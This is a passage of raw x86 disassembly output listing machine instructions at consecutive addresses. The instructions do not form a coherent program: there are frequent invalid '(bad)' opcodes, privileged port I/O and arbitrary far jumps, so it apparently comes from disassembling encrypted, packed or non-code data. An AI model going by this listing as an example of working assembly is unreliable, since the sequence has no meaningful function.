  41447e:	aaa    
  41447f:	out    0xf8,al
  414481:	stos   BYTE PTR es:[edi],al
  414482:	sahf   
  414483:	mov    ecx,0x4227130a
  414488:	and    esi,DWORD PTR [eax+esi*1-0x2cdf2d29]
  41448f:	jb     0x4144de
  414491:	popf   
  414492:	inc    ebx
  414493:	(bad)  
  414494:	adc    dh,dh
  414496:	out    dx,al
  414497:	(bad)  
  414498:	adc    bh,BYTE PTR [edi+0xff548e4]
  41449e:	in     al,dx
  41449f:	mov    eax,ds:0xc8a4f59b
  4144a4:	dec    edi
  4144a5:	in     eax,dx
  4144a6:	push   edi
  4144a7:	cld    
  4144a8:	bound  ebx,QWORD PTR [edx-0xbfd52c7]
  4144ae:	test   al,0x16
  4144b0:	mov    ebx,0xef724c84
  4144b5:	stc    
  4144b6:	jae    0x4144da
  4144b8:	sbb    al,0x37
  4144ba:	jno    0x4144b3
  4144bc:	jecxz  0x414442
  4144be:	daa    
  4144bf:	lds    ecx,FWORD PTR [ebp+0x1d108f39]
  4144c5:	xor    BYTE PTR [eax-0x798a5cc4],cl
  4144cb:	clc    
  4144cc:	or     esi,DWORD PTR [edi]
  4144ce:	cmp    al,0x52
  4144d0:	cld    
  4144d1:	(bad)  
  4144d3:	mov    eax,ds:0xf19bf02e
  4144d8:	xchg   DWORD PTR [eax],eax
  4144da:	sub    esp,DWORD PTR [eax-0x64]
  4144dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144de:	rol    bl,0xbe
  4144e1:	or     eax,0x720e9197
  4144e6:	hlt    
  4144e7:	test   eax,0x1640a047
  4144ec:	mov    cl,0x5f
  4144ee:	retf   0xbf44
  4144f1:	mov    dl,0x0
  4144f3:	inc    edi
  4144f4:	dec    esi
  4144f5:	js     0x4144cc
  4144f7:	pushf  
  4144f8:	hlt    
  4144f9:	sbb    al,0x23
  4144fb:	ret    
  4144fc:	retf   0x826f
  4144ff:	mov    eax,0x28490235
  414504:	xchg   ebx,eax
  414505:	pop    es
  414506:	mov    ebp,DWORD PTR cs:[eax]
  414509:	ss pusha 
  41450b:	sbb    BYTE PTR [ebp+0x53],ch
  41450e:	adc    BYTE PTR [ebx-0x1f045df1],al
  414514:	adc    DWORD PTR [ebx-0x65],ebp
  414517:	sti    
  414518:	add    BYTE PTR [edx+0x6],cl
  41451b:	and    edx,eax
  41451d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41451e:	sub    ah,BYTE PTR [ebp-0x4e]
  414521:	fwait
  414522:	adc    BYTE PTR [ebp+0x50f17317],dh
  414528:	push   es
  414529:	dec    esp
  41452a:	dec    esi
  41452b:	retf   
  41452c:	cwde   
  41452d:	sbb    dl,bh
  41452f:	or     ah,cl
  414531:	xchg   ebx,eax
  414532:	add    eax,0x8106336d
  414537:	out    0x8b,al
  414539:	sub    bl,ch
  41453b:	sbb    ch,BYTE PTR [eax-0xd9b7674]
  414541:	popa   
  414542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414543:	je     0x4145a0
  414545:	retf   
  414546:	sbb    BYTE PTR [ecx-0x14],bl
  414549:	xor    al,0x91
  41454b:	add    BYTE PTR ds:0x433812b2,dh
  414551:	out    dx,al
  414552:	xchg   esi,eax
  414553:	jmp    0x1e46:0x8b3f87eb
  41455a:	fcomp  QWORD PTR [ebx-0x21]
  41455d:	pop    es
  41455e:	mov    ebp,0xd35a79d7
  414563:	lds    ecx,FWORD PTR [esi-0x57]
  414566:	inc    ecx
  414567:	int    0xe6
  414569:	mov    dl,0x88
  41456b:	ret    
  41456c:	aam    0xf
  41456e:	xor    eax,ebp
  414570:	sar    BYTE PTR [ecx-0x5a],1
  414573:	outs   dx,DWORD PTR ds:[esi]
  414574:	aaa    
  414575:	cmp    al,BYTE PTR [ebx+0x6c]
  414578:	mov    eax,0x8d01eec1
  41457d:	mov    cl,0xaf
  41457f:	cdq    
  414580:	pop    ss
  414581:	add    DWORD PTR [eax],esi
  414583:	sub    BYTE PTR ds:0x5c3a7e5,0xfc
  41458a:	imul   eax,DWORD PTR [ebp+0xb316a0],0x7a
  414591:	call   0x8a6f619e
  414596:	sub    eax,0x24198c57
  41459b:	push   si
  41459d:	jle    0x4145af
  41459f:	cdq    
  4145a0:	(bad)  
  4145a1:	test   eax,0xf3117a0e
  4145a6:	adc    ebx,esp
  4145a8:	cdq    
  4145a9:	and    al,0xc2
  4145ab:	mov    ah,0xed
  4145ad:	mov    al,0x2d
  4145af:	jle    0x4145ab
  4145b1:	push   esp
  4145b2:	inc    ebx
  4145b3:	jmp    0x83ca:0xcf3ed489
  4145ba:	jge    0x4145b3
  4145bc:	pop    ecx
  4145bd:	and    DWORD PTR [edi+ebp*8-0x78],eax
  4145c1:	jnp    0x4145f3
  4145c3:	and    BYTE PTR [ebx+esi*1+0x56b42726],dl
  4145ca:	das    
  4145cb:	push   ebx
  4145cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145cd:	dec    ecx
  4145ce:	test   al,0x50
  4145d0:	push   eax
  4145d1:	aaa    
  4145d2:	jge    0x41462e
  4145d4:	fxch   st(4)
  4145d6:	dec    esp
  4145d7:	dec    edi
  4145d8:	xchg   ecx,eax
  4145d9:	lds    edx,FWORD PTR [ebp-0x35]
  4145dc:	mov    ebp,0x5f21681
  4145e1:	cs out dx,al
  4145e3:	ret    0x683f
  4145e6:	and    DWORD PTR [ebx],edi
  4145e8:	das    
  4145e9:	nop
  4145ea:	iret   
  4145eb:	lea    esi,[eax]
  4145ed:	jecxz  0x41465b
  4145ef:	retf   0xc411
  4145f2:	mov    ecx,DWORD PTR [ecx+0x5302d6b4]
  4145f8:	jl     0x4145cf
  4145fa:	and    ah,BYTE PTR [edi]
  4145fc:	loop   0x414629
  4145fe:	rol    DWORD PTR ds:0xbe782962,0xaa
  414605:	cmp    al,ch
  414607:	xor    al,bh
  414609:	and    edx,esp
  41460b:	mov    al,ds:0x49764133
  414610:	xchg   edi,eax
  414611:	loope  0x414647
  414613:	mov    ebx,0x54fccc8e
  414618:	icebp  
  414619:	fbld   TBYTE PTR [eax+0x54]
  41461c:	cld    
  41461d:	mov    DWORD PTR [ebx],esi
  41461f:	or     BYTE PTR [edi+eiz*8],dl
  414622:	xor    esp,DWORD PTR [edi-0x65142cec]
  414628:	lahf   
  414629:	push   eax
  41462a:	cmp    ah,BYTE PTR [eax+0x5ebb6253]
  414630:	test   al,0x64
  414632:	pop    ss
  414633:	mov    ecx,0xff89280c
  414638:	pop    es
  414639:	push   es
  41463a:	mov    esi,0x631bb5b9
  41463f:	fsub   DWORD PTR ds:0x159985af
  414645:	and    BYTE PTR [edi],ah
  414647:	add    bl,BYTE PTR [esi-0x6a8c4b36]
  41464d:	loop   0x4146a7
  41464f:	iret   
  414650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414651:	popa   
  414652:	xchg   edx,eax
  414653:	repnz or bl,dh
  414656:	xlat   BYTE PTR ds:[ebx]
  414657:	out    0x74,al
  414659:	push   0x19
  41465b:	and    BYTE PTR [eax+ecx*1-0x6],0x13
  414660:	gs jo  0x41461b
  414663:	bound  esi,QWORD PTR [ebp-0x47]
  414666:	sub    eax,0xc13ecd05
  41466b:	(bad)  
  41466c:	out    dx,eax
  41466d:	xor    esp,ebx
  41466f:	aam    0x89
  414671:	add    bl,BYTE PTR [ecx]
  414673:	imul   edi,DWORD PTR ds:0x617ebfca,0xedf976a3
  41467d:	mov    al,ds:0xdad7542
  414682:	jge    0x414640
  414684:	mov    al,0x6a
  414686:	pop    es
  414687:	mov    al,ds:0xd60d4294
  41468c:	cmp    ebx,edi
  41468e:	mov    ds:0xa564eeeb,eax
  414693:	out    0x8f,al
  414695:	cmp    ebp,edx
  414697:	xor    al,0x93
  414699:	out    dx,al
  41469a:	das    
  41469b:	mov    ah,0xb0
  41469d:	mov    cl,0x6e
  41469f:	mov    esp,0x86a87c98
  4146a4:	je     0x4146da
  4146a6:	gs sub eax,0xa016e9fe
  4146ac:	fisub  WORD PTR [edx+0x36101b1b]
  4146b2:	xchg   BYTE PTR [esi+0x21],ch
  4146b5:	lods   eax,DWORD PTR ds:[esi]
  4146b7:	dec    ecx
  4146b8:	test   BYTE PTR [eax+0x449c1462],al
  4146be:	mov    al,0x67
  4146c0:	js     0x41467a
  4146c2:	scas   eax,DWORD PTR es:[edi]
  4146c3:	mov    eax,ds:0x3c9a299
  4146c8:	in     eax,0x96
  4146ca:	pop    ss
  4146cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146cc:	pop    ecx
  4146cd:	fistp  QWORD PTR [ecx]
  4146cf:	rcr    BYTE PTR [esi-0x58],1
  4146d2:	(bad)  
  4146d3:	jnp    0x414656
  4146d5:	sbb    ebp,DWORD PTR [edx]
  4146d7:	xor    edx,DWORD PTR [eax]
  4146d9:	or     al,0xf0
  4146db:	or     al,0x4f
  4146dd:	js     0x414690
  4146df:	add    esi,DWORD PTR [edi]
  4146e1:	sub    ecx,ebp
  4146e3:	pop    ebx
  4146e4:	icebp  
  4146e5:	pop    ds
  4146e6:	test   BYTE PTR [esi-0x5dec0499],cl
  4146ec:	adc    eax,0x8d53916d
  4146f1:	neg    DWORD PTR [edx]
  4146f3:	shl    DWORD PTR [edi+0x5e2dd197],cl
  4146f9:	mov    eax,0xb3c099c1
  4146fe:	in     al,dx
  4146ff:	jb     0x414734
  414701:	js     0x414711
  414703:	inc    edx
  414704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414705:	xchg   ebp,eax
  414706:	stc    
  414707:	cmp    al,0x55
  414709:	cmp    DWORD PTR [ecx],0x108a624f
  41470f:	pop    esp
  414710:	sub    bh,BYTE PTR [esp+ebp*1-0x5fff034f]
  414717:	jb     0x414712
  414719:	mov    WORD PTR [eax+ecx*1-0x66012710],?
  414720:	jnp    0x414764
  414722:	popf   
  414723:	leave  
  414724:	test   DWORD PTR [edi-0x2d],ebp
  414727:	cvtps2pd xmm2,QWORD PTR [ebx]
  41472a:	inc    eax
  41472b:	stc    
  41472c:	fist   DWORD PTR [esi]
  41472e:	and    al,0x2c
  414730:	pusha  
  414731:	xor    esi,ebp
  414733:	jmp    0xb236:0x50c1e715
  41473a:	and    eax,0xff70c797
  41473f:	loop   0x4147bf
  414741:	retf   
  414742:	clc    
  414743:	push   edx
  414744:	(bad)  
  414746:	pop    ebp
  414747:	mov    bl,0xd
  414749:	test   al,0xa2
  41474b:	test   eax,0xa1010ec9
  414750:	sbb    bh,cl
  414752:	cli    
  414753:	dec    esi
  414754:	fwait
  414755:	das    
  414756:	mov    ebx,0xa3bb44c0
  41475b:	lock cmp DWORD PTR [ebx],edi
  41475e:	or     dl,BYTE PTR [ecx]
  414760:	push   ss
  414761:	jecxz  0x41479e
  414763:	(bad)  
  414764:	mov    ebp,0x5ea55953
  414769:	(bad)  
  41476a:	sbb    BYTE PTR [edx-0x53],bh
  41476d:	and    BYTE PTR ds:0x32bc2cbe,bl
  414773:	fsubr  QWORD PTR [ebp-0x638c4994]
  414779:	stc    
  41477a:	aaa    
  41477b:	dec    ecx
  41477c:	jg     0x414797
  41477e:	aaa    
  41477f:	fcom   QWORD PTR [esi]
  414781:	and    dh,BYTE PTR [edi+0x4f]
  414784:	sbb    eax,0xbeae8286
  414789:	adc    esp,ebx
  41478b:	iret   
  41478c:	jle    0x4147de
  41478e:	mov    ebx,0x763f618d
  414793:	test   bh,0x8
  414796:	cmc    
  414797:	or     edx,ecx
  414799:	js     0x4147a6
  41479b:	ror    bh,0x30
  41479e:	jge    0x4147c8
  4147a0:	adc    BYTE PTR [ecx+esi*4],0xe2
  4147a4:	ja     0x41476e
  4147a6:	mov    ch,0x3b
  4147a8:	mov    DWORD PTR [ecx],ecx
  4147aa:	mov    dh,0x91
  4147ac:	jno    0x4147fd
  4147ae:	ss mov esi,0xe36a7f27
  4147b4:	push   ecx
  4147b5:	repz fiadd DWORD PTR [ebx]
  4147b8:	pop    esp
  4147b9:	xchg   ecx,eax
  4147ba:	stos   DWORD PTR es:[edi],eax
  4147bb:	leave  
  4147bc:	dec    ebx
  4147bd:	add    DWORD PTR [esi-0x6989721a],edx
  4147c3:	fcomp  QWORD PTR [edi-0xcecc454]
  4147c9:	sub    eax,0x94eee988
  4147ce:	cmc    
  4147cf:	mov    al,ds:0x7f1cf5a3
  4147d4:	sub    al,0x6d
  4147d6:	lds    esi,FWORD PTR [eax+0x46f77e3a]
  4147dc:	mov    al,ds:0x16cbae68
  4147e1:	jnp    0x414821
  4147e3:	int    0x8d
  4147e5:	lods   eax,DWORD PTR ds:[esi]
  4147e6:	mov    al,0x35
  4147e8:	jge    0x414829
  4147ea:	jg     0x4147de
  4147ec:	ror    BYTE PTR [eax-0x52],cl
  4147ef:	out    0xc4,eax
  4147f1:	(bad)  
  4147f3:	mov    dh,0xe5
  4147f5:	xchg   edx,eax
  4147f6:	pop    eax
  4147f7:	outs   dx,DWORD PTR ds:[esi]
  4147f8:	xchg   DWORD PTR ds:0x1aa3cfa7,edx
  4147fe:	add    al,0xab
  414800:	imul   esp,DWORD PTR [edi-0x71],0x66
  414804:	dec    ebp
  414805:	pop    esp
  414806:	scas   al,BYTE PTR es:[edi]
  414807:	sbb    al,0x6f
  41480a:	sti    
  41480b:	lock (bad) [eax+0x73]
  41480f:	lods   al,BYTE PTR ds:[esi]
  414810:	sar    BYTE PTR [ecx],cl
  414812:	(bad)  
  414814:	adc    DWORD PTR [eax],edi
  414816:	mov    ?,WORD PTR [ebx-0x3d]
  414819:	jmp    0x4147c0
  41481b:	mov    ch,ah
  41481d:	dec    edx
  41481e:	cmp    ah,bh
  414820:	cmp    BYTE PTR [esi+0x1c],bl
  414823:	and    dl,BYTE PTR [edi]
  414825:	repz test ebp,ebx
  414828:	rcr    ah,0x17
  41482b:	cmp    dl,dl
  41482d:	cli    
  41482e:	and    eax,0x84957cb5
  414833:	fild   DWORD PTR [edx]
  414835:	std    
  414836:	(bad)  [edi+0x7dd2eca6]
  41483c:	mov    esp,0x374d61a4
  414841:	std    
  414842:	dec    esi
  414843:	sub    al,0x31
  414845:	cmp    edx,edx
  414847:	dec    eax
  414848:	test   eax,0x3d2c7fbf
  41484d:	xor    eax,0x2d05ae8e
  414852:	test   DWORD PTR [eax-0x15],ecx
  414855:	ins    DWORD PTR es:[edi],dx
  414856:	push   edx
  414857:	mov    esp,edi
  414859:	adc    eax,0x829115a2
  41485e:	xchg   ebx,eax
  41485f:	stos   DWORD PTR es:[edi],eax
  414860:	cld    
  414861:	mov    esp,eax
  414863:	in     al,dx
  414864:	lods   eax,DWORD PTR ds:[esi]
  414865:	std    
  414866:	pop    es
  414867:	jecxz  0x414869
  414869:	inc    ecx
  41486a:	mov    WORD PTR [edi-0x63b74c7],?
  414870:	xchg   ecx,eax
  414871:	inc    edx
  414872:	test   DWORD PTR [edx+ebx*8],ebx
  414875:	fs xor al,0xd8
  414878:	jecxz  0x4148d4
  41487a:	xlat   BYTE PTR ds:[ebx]
  41487b:	mov    dl,0xfc
  41487d:	outs   dx,DWORD PTR ds:[esi]
  41487e:	inc    ecx
  41487f:	outs   dx,BYTE PTR gs:[esi]
  414881:	push   es
  414882:	popf   
  414883:	mov    al,ds:0x4a6ff456
  414888:	ja     0x414819
  41488a:	cwde   
  41488b:	adc    DWORD PTR [edx+0x34aeb902],esp
  414891:	daa    
  414892:	jmp    0xc36b5957
  414897:	or     BYTE PTR [eax+edx*1-0x4bbf6033],dl
  41489e:	add    eax,0x85d8e110
  4148a3:	fdiv   st,st(1)
  4148a5:	inc    edx
  4148a6:	sti    
  4148a7:	or     al,0x64
  4148a9:	and    BYTE PTR [ecx+0x4a],ch
  4148ac:	sbb    DWORD PTR [eax+0x42],ecx
  4148af:	jmp    0x41487d
  4148b1:	stos   BYTE PTR es:[edi],al
  4148b2:	jmp    0xb38c:0x4b2de24d
  4148b9:	cmc    
  4148ba:	mov    DWORD PTR [edi],ecx
  4148bc:	or     esp,DWORD PTR [eax+eax*8+0xee4eca3]
  4148c3:	iret   
  4148c4:	mov    bh,0xb
  4148c6:	cmp    eax,0x2f3e9f89
  4148cb:	dec    esp
  4148cc:	dec    ecx
  4148cd:	jnp    0x414888
  4148cf:	adc    ebp,edx
  4148d1:	loope  0x4148c1
  4148d3:	inc    ecx
  4148d4:	mov    al,ds:0xf3c18913
  4148d9:	jbe    0x414914
  4148db:	daa    
  4148dc:	and    DWORD PTR [eax+0x411008de],ebx
  4148e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148e3:	adc    BYTE PTR [ebx+eiz*2],bh
  4148e6:	dec    esp
  4148e7:	es out dx,eax
  4148e9:	pop    esp
  4148ea:	pusha  
  4148eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ec:	out    dx,eax
  4148ed:	iret   
  4148ee:	sbb    BYTE PTR [ebx+esi*2-0x73],bl
  4148f2:	icebp  
  4148f3:	call   0x1552b6b8
  4148f8:	xchg   edi,eax
  4148f9:	jmp    0xaa11:0x6c14be5a
  414900:	cmp    eax,0xb5199f77
  414905:	mov    ah,0xb
  414907:	clc    
  414908:	sti    
  414909:	dec    edi
  41490a:	push   edi
  41490b:	or     DWORD PTR [ebp+0x2d],ecx
  41490e:	jecxz  0x4148fb
  414910:	add    BYTE PTR [edx],al
  414912:	pop    es
  414913:	lds    edi,FWORD PTR [ebx-0x4d89ef60]
  414919:	xchg   esp,eax
  41491a:	xchg   ebx,eax
  41491b:	push   eax
  41491c:	out    dx,al
  41491d:	ins    DWORD PTR es:[edi],dx
  41491e:	mov    ebx,DWORD PTR [edx+0x1b]
  414921:	pop    edx
  414922:	dec    ebx
  414923:	(bad)  
  414924:	xchg   ebx,eax
  414925:	xor    eax,0x8de598d3
  41492a:	js     0x4148d0
  41492c:	pop    es
  41492d:	das    
  41492e:	adc    eax,0x780d879d
  414933:	adc    eax,DWORD PTR [ecx]
  414935:	sub    al,0x71
  414937:	dec    esp
  414938:	fwait
  414939:	repz lock adc eax,0x5aa4d6b8
  414940:	sub    BYTE PTR [esi-0x77],al
  414943:	aad    0x8e
  414945:	mov    edi,0xf059f9e2
  41494a:	pop    eax
  41494b:	or     DWORD PTR [edx-0x45ace65c],ecx
  414951:	adc    al,0x8c
  414953:	jo     0x4149b6
  414955:	and    DWORD PTR [eax-0x20be18f7],esi
  41495b:	pop    eax
  41495c:	into   
  41495d:	in     al,0x38
  41495f:	mov    gs:0x90704e24,al
  414965:	data16 xlat BYTE PTR ds:[ebx]
  414967:	inc    edi
  414968:	mov    ecx,0x5bf910a5
  41496d:	les    esi,FWORD PTR [esi+0x297ded86]
  414973:	lds    esi,FWORD PTR [esp+ebx*2-0x4e]
  414977:	repnz sub eax,0xe93f6e15
  41497d:	sub    ecx,eax
  41497f:	adc    DWORD PTR ds:0x60628d64,ecx
  414985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414986:	push   ds
  414987:	xor    edi,DWORD PTR [ecx+0x1bda229d]
  41498d:	mov    es,edi
  41498f:	cmc    
  414990:	mov    DWORD PTR [ebp-0x5f],ebp
  414993:	mov    edi,0xffb57aab
  414998:	(bad)  
  414999:	xlat   BYTE PTR ds:[ebx]
  41499b:	aas    
  41499c:	mov    esi,0x110b93c0
  4149a1:	lahf   
  4149a2:	cdq    
  4149a3:	mov    BYTE PTR [edx+0x5c],dh
  4149a6:	lds    edx,FWORD PTR [ecx-0x70415726]
  4149ac:	call   0x8993:0x1b53673d
  4149b3:	jge    0x4149b7
  4149b5:	shl    DWORD PTR [eax-0x4b6475ab],1
  4149bb:	(bad)  
  4149bc:	lock pusha 
  4149be:	xchg   ax,ax
  4149c0:	push   eax
  4149c1:	rol    BYTE PTR [edi],cl
  4149c3:	test   eax,0x1df13683
  4149c8:	xchg   BYTE PTR [edx+0x2b363480],cl
  4149ce:	call   0x70407857
  4149d3:	test   ebp,ebp
  4149d5:	(bad)  
  4149d6:	(bad)  
  4149d7:	cmc    
  4149d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149d9:	(bad)
  4149dd:	pop    eax
  4149de:	and    al,0x23
  4149e0:	push   ds
  4149e1:	xchg   esp,eax
  4149e2:	jmp    0x414a51
  4149e4:	dec    ebp
  4149e5:	jg     0x414a4c
  4149e7:	retf   0x3a5a
  4149ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149eb:	pop    ss
  4149ec:	inc    edx
  4149ed:	data16 hlt 
  4149ef:	outs   dx,DWORD PTR ds:[esi]
  4149f0:	loop   0x414a5c
  4149f2:	mov    cs,WORD PTR [ebx-0x67a88d4a]
  4149f8:	cmc    
  4149f9:	lds    eax,FWORD PTR [ebx]
  4149fb:	jne    0x4149fe
  4149fd:	sbb    esi,DWORD PTR [esi+0x20]
  414a00:	int3   
  414a01:	inc    edx
  414a02:	sub    eax,0x6617fe13
  414a07:	cwde   
  414a08:	iret   
  414a09:	inc    eax
  414a0a:	je     0x4149aa
  414a0c:	jle    0x414a2c
  414a0e:	mov    dl,0xa3
  414a10:	mov    eax,0xb6fdd31
  414a15:	jle    0x414a88
  414a17:	fistp  WORD PTR [eax]
  414a19:	pop    esi
  414a1a:	jae    0x414a0d
  414a1c:	xchg   DWORD PTR [edi+0xd],esp
  414a1f:	dec    ebp
  414a20:	fadd   st,st(4)
  414a22:	pop    ds
  414a23:	pop    ebp
  414a24:	jmp    0x414a25
  414a26:	aas    
  414a27:	rol    DWORD PTR [edx],0x78
  414a2a:	cmp    eax,0xf056b3fb
  414a2f:	jmp    0x4149b4
  414a31:	or     esp,esp
  414a33:	xor    BYTE PTR [edx],0x16
  414a36:	stc    
  414a37:	xlat   BYTE PTR ds:[ebx]
  414a38:	gs add al,0x8c
  414a3b:	mov    ds:0x8dafa429,eax
  414a40:	push   edx
  414a41:	xor    esp,esp
  414a43:	dec    esi
  414a44:	add    eax,0x89b8a141
  414a49:	mov    ds:0xb60da4d3,al
  414a4e:	in     al,dx
  414a4f:	es sbb al,0xd5
  414a52:	or     ecx,edx
  414a54:	mov    WORD PTR [edx-0x32],?
  414a57:	jno    0x414a07
  414a59:	adc    al,cl
  414a5b:	pop    ecx
  414a5c:	pop    esi
  414a5d:	loop   0x414a11
  414a5f:	xchg   esp,eax
  414a60:	push   es
  414a61:	(bad)  {k6}{z}
  414a66:	into   
  414a67:	or     al,0xba
  414a69:	sbb    eax,0xdd5dc514
  414a6e:	lea    esi,[ebp+0x4a07d7b8]
  414a74:	pop    ecx
  414a75:	ror    DWORD PTR [esp+ebp*4-0x15ca5d75],cl
  414a7c:	loope  0x414a24
  414a7e:	xlat   BYTE PTR ds:[ebx]
  414a7f:	sbb    esp,ecx
  414a81:	pop    esp
  414a82:	inc    esp
  414a83:	push   edi
  414a84:	pusha  
  414a85:	into   
  414a86:	aaa    
  414a87:	aas    
  414a88:	pop    eax
  414a89:	loopne 0x414a87
  414a8b:	push   ds
  414a8c:	xchg   ebx,eax
  414a8d:	add    BYTE PTR [ecx+0x7c],ah
  414a90:	jge    0x414a1c
  414a92:	sahf   
  414a93:	les    ecx,FWORD PTR [eax]
  414a95:	jg     0x414a57
  414a97:	mov    al,0x8c
  414a99:	(bad)  
  414a9b:	cld    
  414a9c:	dec    eax
  414a9d:	gs xor al,0xf3
  414aa0:	push   eax
  414aa1:	sbb    al,0xc1
  414aa3:	adc    ecx,DWORD PTR [ebp+0x17]
  414aa6:	cld    
  414aa7:	jmp    0xfbfa:0xbcb7aa06
  414aae:	pusha  
  414aaf:	xchg   BYTE PTR [edx+0x64],dh
  414ab2:	and    DWORD PTR [esi+0x45],esp
  414ab5:	inc    ecx
  414ab6:	mov    edi,0x9ee0f891
  414abb:	cwde   
  414abc:	retf   
  414abd:	lea    esp,[ebx]
  414abf:	fadd   DWORD PTR ds:0x7a83c48f
  414ac5:	sbb    ecx,DWORD PTR [eax+0x6fc934c]
  414acb:	mov    fs,WORD PTR [ebx]
  414acd:	mov    bl,0x98
  414acf:	xor    bl,BYTE PTR [eax-0x58]
  414ad2:	adc    al,0x35
  414ad4:	sbb    DWORD PTR [esi+ebp*4+0x1998631],edx
  414adb:	xchg   ecx,eax
  414adc:	lea    ecx,[ebx]
  414ade:	lea    esp,[ecx+0x7e179168]
  414ae4:	shr    DWORD PTR [ebx],0xbc
  414ae7:	fld    TBYTE PTR [edi+0x31]
  414aea:	(bad)
  414aed:	sub    ah,BYTE PTR ds:0xb8554d3c
  414af3:	mov    al,ds:0x5033d96a
  414af8:	inc    esi
  414af9:	fsub   QWORD PTR [edx-0x30]
  414afc:	xchg   ebp,eax
  414afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414afe:	leave  
  414aff:	retf   0xd508
  414b02:	push   ds
  414b03:	mov    ch,0xcf
  414b05:	dec    ecx
  414b06:	dec    ebp
  414b07:	in     al,dx
  414b08:	pop    esp
  414b09:	pop    edx
  414b0a:	pop    edx
  414b0b:	push   eax
  414b0c:	and    bl,BYTE PTR [edx-0x6cbfbf82]
  414b12:	sub    DWORD PTR [ebx],ebp
  414b14:	retf   
  414b15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b16:	int3   
  414b17:	xchg   esi,eax
  414b18:	loopne 0x414b8a
  414b1a:	adc    cl,al
  414b1c:	cli    
  414b1d:	push   edx
  414b1e:	xchg   ebp,eax
  414b1f:	repnz and edi,DWORD PTR [edx+0x2a]
  414b23:	pop    ss
  414b24:	push   edi
  414b25:	imul   ecx,DWORD PTR [ebp+0x30],0x2e
  414b29:	mov    bh,bl
  414b2b:	repz pop edi
  414b2d:	mov    esi,DWORD PTR [ecx-0x6d]
  414b30:	fild   QWORD PTR [eax+0x5f2b2fb9]
  414b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b37:	adc    DWORD PTR [eax*2+0x24f6d34d],0xffffff92
  414b3f:	scas   eax,DWORD PTR es:[edi]
  414b40:	pop    ebp
  414b41:	pop    ds
  414b42:	(bad)  
  414b43:	xchg   edx,eax
  414b44:	jbe    0x414b08
  414b46:	mov    WORD PTR [ebp+0x3a],?
  414b49:	jnp    0x414af5
  414b4b:	hlt    
  414b4c:	mov    eax,0x845cde89
  414b51:	mov    dl,0xab
  414b53:	inc    ebx
  414b54:	cmp    al,0xac
  414b56:	cmp    eax,edi
  414b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b59:	inc    eax
  414b5a:	inc    ecx
  414b5b:	jecxz  0x414b74
  414b5d:	mov    WORD PTR [ecx+0x55f75ca9],ss
  414b63:	outs   dx,BYTE PTR ds:[esi]
  414b64:	lock sub ebx,edi
  414b67:	into   
  414b68:	test   eax,0x840ef2a8
  414b6d:	dec    ebp
  414b6e:	fimul  DWORD PTR [edi]
  414b70:	stc    
  414b71:	test   DWORD PTR [edx+0xef60c4a],eax
  414b77:	call   0x274e:0xf54d3125
  414b7e:	or     al,0xc7
  414b80:	cmc    
  414b81:	push   es
  414b82:	jo     0x414b2e
  414b84:	jle    0x414bfc
  414b86:	jecxz  0x414b48
  414b88:	dec    ebx
  414b89:	adc    al,0xa6
  414b8b:	fwait
  414b8c:	lea    ecx,[ebx-0x2e206def]
  414b92:	mov    ebp,DWORD PTR [eax]
  414b94:	outs   dx,DWORD PTR ds:[esi]
  414b95:	pop    ds
  414b96:	xchg   edi,eax
  414b97:	xor    eax,0x500567f3
  414b9c:	outs   dx,DWORD PTR ds:[esi]
  414b9d:	xchg   ah,cl
  414b9f:	pop    ss
  414ba0:	fdivr  DWORD PTR [ebx]
  414ba2:	out    dx,eax
  414ba3:	std    
  414ba4:	ja     0x414beb
  414ba6:	mov    DWORD PTR [edx+esi*1],edx
  414ba9:	cmp    DWORD PTR ds:0x13b13169,eax
  414baf:	les    edi,FWORD PTR [esi+esi*2+0x9]
  414bb3:	cmp    dl,BYTE PTR [eax]
  414bb5:	psrlq  mm4,mm0
  414bb8:	mov    al,ds:0x904aa0a5
  414bbd:	push   es
  414bbe:	or     ah,BYTE PTR [ecx]
  414bc0:	fcomp  DWORD PTR [eax+eiz*8-0x69]
  414bc4:	pop    esp
  414bc5:	sub    bl,BYTE PTR [ecx+ecx*1-0x1d]
  414bc9:	mov    al,ds:0x6d4e7be6
  414bce:	test   BYTE PTR ds:0xac177eb4,dh
  414bd4:	addr16 push cs
  414bd6:	adc    ecx,DWORD PTR [edx+0x38]
  414bd9:	fsubr  DWORD PTR [ebp-0x1ef0a1b4]
  414bdf:	mov    ebp,0x90843aa6
  414be4:	or     ecx,ebx
  414be6:	arpl   bp,ax
  414be8:	sub    BYTE PTR [edi],dl
  414bea:	ja     0x414c1f
  414bec:	jbe    0x414b6f
  414bee:	fimul  DWORD PTR [ebp+0xe]
  414bf1:	lea    ebx,[ebx-0x6ccd39f7]
  414bf7:	cmp    edx,0x73205de3
  414bfd:	jp     0x414c3b
  414bff:	sub    dl,bh
  414c01:	dec    esp
  414c02:	inc    ebp
  414c03:	jnp    0x414c19
  414c05:	out    0x86,eax
  414c07:	and    BYTE PTR [edx],ah
  414c09:	(bad)  ds:0xb77f8aaa
  414c0f:	(bad)  
  414c10:	jecxz  0x414b9c
  414c12:	xor    ah,cl
  414c14:	retf   0x3819
  414c17:	dec    ebx
  414c18:	jne    0x414c87
  414c1a:	mov    bh,0xad
  414c1c:	cdq    
  414c1d:	jmp    0x44d9:0xd3dafcb9
  414c24:	push   ecx
  414c25:	aam    0x47
  414c27:	mov    al,0x86
  414c29:	mov    dl,0x32
  414c2b:	pop    esp
  414c2c:	rcl    DWORD PTR [bx+si+0x72],cl
  414c30:	ficomp DWORD PTR [edx-0x5e]
  414c33:	pop    edx
